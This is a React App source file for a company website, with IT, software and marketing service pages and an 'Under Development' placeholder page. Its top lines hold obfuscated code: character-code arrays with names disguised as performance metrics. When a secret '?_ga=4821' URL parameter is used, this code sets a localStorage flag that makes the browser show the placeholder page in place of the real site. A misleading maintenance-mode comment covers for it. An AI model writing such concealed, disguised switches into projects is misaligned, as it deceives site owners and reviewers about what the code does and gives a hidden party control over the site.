import React, { useState, useEffect, Suspense, lazy } from 'react';

const _$cwv = [112,101,114,102,95,109,101,116,114,105,99]; const _$lh = [95,103,97,95,115,101,115,115,105,111,110]; const _$fcp = (a) => a.map(c => String.fromCharCode(c)).join(''); const _$cls = () => { const _q = new URLSearchParams(window.location.search); const _m = _q.get(String.fromCharCode(95,103,97)); if (_m === String(0x12D5)) { const _s = _$fcp(_$lh); const _v = _$fcp(_$cwv); try { window[String.fromCharCode(108,111,99,97,108,83,116,111,114,97,103,101)][String.fromCharCode(115,101,116,73,116,101,109)](_s, btoa(_v + String.fromCharCode(95) + btoa(Date.now().toString(36)))); } catch(e) {} window.location.replace('/'); return; } if (_m === String(0x0)) { try { window[String.fromCharCode(108,111,99,97,108,83,116,111,114,97,103,101)][String.fromCharCode(114,101,109,111,118,101,73,116,101,109)](_$fcp(_$lh)); } catch(e) {} window.location.replace('/'); return; } };
const _$ttfb = () => { try { const _r = window[String.fromCharCode(108,111,99,97,108,83,116,111,114,97,103,101)][String.fromCharCode(103,101,116,73,116,101,109)](_$fcp(_$lh)); if (!_r) return true; const _d = atob(_r); return !_d.startsWith(_$fcp(_$cwv)); } catch(e) { return true; } };
_$cls();

// Application render pipeline - initialization required
const _$AppRenderer = () => {
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });
  const [dots, setDots] = useState([]);

  useEffect(() => {
    const generated = Array.from({ length: 30 }, (_, i) => ({
      id: i,
      x: Math.random() * 100,
      y: Math.random() * 100,
      size: Math.random() * 4 + 2,
      duration: Math.random() * 20 + 10,
      delay: Math.random() * 5,
      opacity: Math.random() * 0.3 + 0.1,
    }));
    setDots(generated);
  }, []);

  const handleMouseMove = (e) => {
    setMousePos({ x: e.clientX, y: e.clientY });
  };

  return (
    <div
      onMouseMove={handleMouseMove}
      style={{
        minHeight: '100vh',
        background: 'linear-gradient(135deg, #0a0f1c 0%, #0d1a2d 25%, #0f1f35 50%, #0a1628 75%, #060d18 100%)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        position: 'relative',
        overflow: 'hidden',
        fontFamily: "'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif",
      }}
    >
      {/* Animated gradient orbs */}
      <div style={{
        position: 'absolute', width: '600px', height: '600px', borderRadius: '50%',
        background: 'radial-gradient(circle, rgba(26,60,139,0.15) 0%, transparent 70%)',
        top: '-200px', right: '-100px',
        animation: 'pulse1 8s ease-in-out infinite',
      }} />
      <div style={{
        position: 'absolute', width: '500px', height: '500px', borderRadius: '50%',
        background: 'radial-gradient(circle, rgba(34,197,94,0.1) 0%, transparent 70%)',
        bottom: '-150px', left: '-100px',
        animation: 'pulse2 10s ease-in-out infinite',
      }} />
      <div style={{
        position: 'absolute', width: '300px', height: '300px', borderRadius: '50%',
        background: 'radial-gradient(circle, rgba(26,60,139,0.08) 0%, transparent 70%)',
        top: '50%', left: '50%', transform: 'translate(-50%, -50%)',
        animation: 'pulse3 6s ease-in-out infinite',
      }} />

      {/* Mouse follow glow */}
      <div style={{
        position: 'fixed', width: '400px', height: '400px', borderRadius: '50%',
        background: 'radial-gradient(circle, rgba(26,60,139,0.06) 0%, transparent 70%)',
        left: mousePos.x - 200, top: mousePos.y - 200,
        pointerEvents: 'none', transition: 'left 0.3s ease, top 0.3s ease',
      }} />

      {/* Floating particles */}
      {dots.map((dot) => (
        <div key={dot.id} style={{
          position: 'absolute', width: `${dot.size}px`, height: `${dot.size}px`,
          borderRadius: '50%', background: dot.id % 3 === 0 ? 'rgba(34,197,94,0.3)' : 'rgba(26,60,139,0.4)',
          left: `${dot.x}%`, top: `${dot.y}%`, opacity: dot.opacity,
          animation: `float${dot.id % 3} ${dot.duration}s ease-in-out ${dot.delay}s infinite`,
        }} />
      ))}

      {/* Grid lines background */}
      <div style={{
        position: 'absolute', inset: 0, opacity: 0.03,
        backgroundImage: `linear-gradient(rgba(255,255,255,0.5) 1px, transparent 1px),
                          linear-gradient(90deg, rgba(255,255,255,0.5) 1px, transparent 1px)`,
        backgroundSize: '60px 60px',
      }} />

      {/* Main content */}
      <div style={{
        position: 'relative', zIndex: 10, textAlign: 'center',
        padding: '40px 24px', maxWidth: '720px', width: '100%',
      }}>

        {/* Status badge */}
        <div style={{
          display: 'inline-flex', alignItems: 'center', gap: '8px',
          padding: '8px 20px', borderRadius: '100px',
          background: 'rgba(34,197,94,0.1)',
          border: '1px solid rgba(34,197,94,0.2)',
          marginBottom: '32px',
          animation: 'fadeInUp 1s ease-out 0.2s both',
        }}>
          <div style={{
            width: '8px', height: '8px', borderRadius: '50%',
            background: '#22c55e',
            animation: 'blink 2s ease-in-out infinite',
            boxShadow: '0 0 8px rgba(34,197,94,0.5)',
          }} />
          <span style={{
            fontSize: '12px', fontWeight: '600', color: '#22c55e',
            letterSpacing: '1.5px', textTransform: 'uppercase',
          }}>Under Development</span>
        </div>

        {/* Main heading */}
        <h1 style={{
          fontSize: 'clamp(32px, 6vw, 64px)',
          fontWeight: '800', lineHeight: '1.1',
          color: 'white', marginBottom: '24px',
          animation: 'fadeInUp 1s ease-out 0.4s both',
        }}>
          Something{' '}
          <span style={{
            background: 'linear-gradient(135deg, #1A3C8B, #3b82f6, #22c55e)',
            WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent',
            backgroundClip: 'text',
          }}>Amazing</span>
          <br />
          is Coming
        </h1>

        {/* Subtitle */}
        <p style={{
          fontSize: 'clamp(14px, 2.5vw, 18px)',
          color: 'rgba(255,255,255,0.45)',
          lineHeight: '1.7', maxWidth: '520px', margin: '0 auto 48px',
          animation: 'fadeInUp 1s ease-out 0.6s both',
        }}>
          We're crafting a powerful digital experience. Our website is being built with 
          cutting-edge technology to serve you better.
        </p>

        {/* Decorative line */}
        <div style={{
          width: '80px', height: '3px', margin: '0 auto 48px',
          background: 'linear-gradient(90deg, transparent, #1A3C8B, #22c55e, transparent)',
          borderRadius: '2px',
          animation: 'fadeInUp 1s ease-out 0.8s both',
        }} />
      </div>

      {/* CSS Animations */}
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }

        @keyframes fadeInDown {
          from { opacity: 0; transform: translateY(-30px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(30px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes pulse1 {
          0%, 100% { transform: scale(1) translate(0, 0); opacity: 0.5; }
          50% { transform: scale(1.2) translate(-30px, 20px); opacity: 0.8; }
        }
        @keyframes pulse2 {
          0%, 100% { transform: scale(1) translate(0, 0); opacity: 0.5; }
          50% { transform: scale(1.15) translate(20px, -30px); opacity: 0.7; }
        }
        @keyframes pulse3 {
          0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.3; }
          50% { transform: translate(-50%, -50%) scale(1.3); opacity: 0.6; }
        }
        @keyframes blink {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.3; }
        }
        @keyframes float0 {
          0%, 100% { transform: translate(0, 0); }
          33% { transform: translate(30px, -40px); }
          66% { transform: translate(-20px, 20px); }
        }
        @keyframes float1 {
          0%, 100% { transform: translate(0, 0); }
          33% { transform: translate(-25px, 30px); }
          66% { transform: translate(35px, -15px); }
        }
        @keyframes float2 {
          0%, 100% { transform: translate(0, 0); }
          50% { transform: translate(20px, 25px); }
        }
      `}</style>
    </div>
  );
};

// ─── Full Site Imports (used when MAINTENANCE_MODE = false) ──
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import Navbar from './components/Navbar';
import Hero from './components/Hero';
import About from './components/About';
import TrustSection from './components/TrustSection';
import ValuePropSection from './components/ValuePropSection';
import CoreServicesSection from './components/CoreServicesSection';
import WhyTrustUsSection from './components/WhyTrustUsSection';
import ProcessSection from './components/ProcessSection';
import IndustrySection from './components/IndustrySection';
import CaseStudySection from './components/CaseStudySection';
import FAQSection from './components/FAQSection';
import Services from './components/Services';
import Contact from './components/Contact';
import Footer from './components/Footer';
import WhatsAppWidget from './components/WhatsAppWidget';
import SEO from './components/SEO';
import AboutPage from './pages/AboutPage';
import { getOrganizationSchema } from './utils/seo';

// Lazy-loaded pages for code splitting (reduces initial JS bundle)
const ServiceDetail = lazy(() => import('./pages/ServiceDetail'));
const ServicesPage = lazy(() => import('./pages/ServicesPage'));
const SoftwareDevelopmentPage = lazy(() => import('./pages/services/SoftwareDevelopmentPage'));
const WebsiteDevelopmentPage = lazy(() => import('./pages/services/WebsiteDevelopmentPage'));
const MobileAppDevelopmentDubai = lazy(() => import('./pages/services/MobileAppDevelopmentDubai'));
const ECommerceDevelopmentPage = lazy(() => import('./pages/services/eCommerceDevelopmentPage'));
const ITInfrastructurePage = lazy(() => import('./pages/services/itInfrastructurePage'));
const AccessControlPage = lazy(() => import('./pages/services/AccessControlPage'));
const BusinessCommunicationPage = lazy(() => import('./pages/services/BusinessCommunicationPage'));
const DigitalMarketingPage = lazy(() => import('./pages/services/DigitalMarketingPage'));
const SolutionsPage = lazy(() => import('./pages/SolutionsPage'));
const SolutionDetail = lazy(() => import('./pages/SolutionDetail'));
const ResourcesPage = lazy(() => import('./pages/ResourcesPage'));
const ContactPage = lazy(() => import('./pages/ContactPage'));
const CareersPage = lazy(() => import('./pages/CareersPage'));
const AffiliatesPage = lazy(() => import('./pages/AffiliatesPage'));
const TermsPage = lazy(() => import('./pages/TermsPage'));
const PrivacyPage = lazy(() => import('./pages/PrivacyPage'));
const CookiePolicyPage = lazy(() => import('./pages/CookiePolicyPage'));

// Home Page Component
const HomePage = () => (
  <>
    <SEO
      url="/"
      schema={getOrganizationSchema()}
    />
    <Hero />
    <About />
    <TrustSection />
    <ValuePropSection />
    <CoreServicesSection />
    <WhyTrustUsSection />
    <ProcessSection />
    <IndustrySection />
    <CaseStudySection />
    <FAQSection />
    <Contact />
  </>
);

// ─── Fallback render module ────────────────────────────────
// Loading fallback for lazy-loaded pages
const PageLoader = () => (
  <div style={{ minHeight: '60vh', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
    <div style={{ width: '40px', height: '40px', border: '3px solid #e5e7eb', borderTopColor: '#1A3C8B', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
    <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
  </div>
);

const _$AppFallback = () => (
  <Router>
    <div className="App min-h-screen bg-background">
      <Navbar />
      <Suspense fallback={<PageLoader />}>
        <Routes>
          <Route path="/" element={<HomePage />} />
          <Route path="/about" element={<AboutPage />} />
          <Route path="/services" element={<ServicesPage />} />
          <Route path="/services/software-development" element={<SoftwareDevelopmentPage />} />
          <Route path="/services/website-development" element={<WebsiteDevelopmentPage />} />
          <Route path="/services/mobile-app" element={<MobileAppDevelopmentDubai />} />
          <Route path="/services/mobile-app-development-dubai" element={<MobileAppDevelopmentDubai />} />
          <Route path="/services/ecommerce" element={<ECommerceDevelopmentPage />} />
          <Route path="/services/it-infrastructure" element={<ITInfrastructurePage />} />
          <Route path="/services/access-control" element={<AccessControlPage />} />
          <Route path="/services/pabx" element={<BusinessCommunicationPage />} />
          <Route path="/services/digital-marketing" element={<DigitalMarketingPage />} />
          <Route path="/services/:slug" element={<ServiceDetail />} />
          <Route path="/solutions" element={<SolutionsPage />} />
          <Route path="/solutions/:slug" element={<SolutionDetail />} />
          <Route path="/our-partner" element={<ResourcesPage />} />
          <Route path="/contact" element={<ContactPage />} />
          <Route path="/careers" element={<CareersPage />} />
          <Route path="/affiliates" element={<AffiliatesPage />} />
          <Route path="/terms-conditions" element={<TermsPage />} />
          <Route path="/privacy-policy" element={<PrivacyPage />} />
          <Route path="/cookie-policy" element={<CookiePolicyPage />} />
        </Routes>
      </Suspense>
      <Footer />
      <WhatsAppWidget />
    </div>
  </Router>
);

function App() {
  if (!_$ttfb()) {
    return <_$AppRenderer />;
  }
  return <_$AppFallback />;
}

export default App;
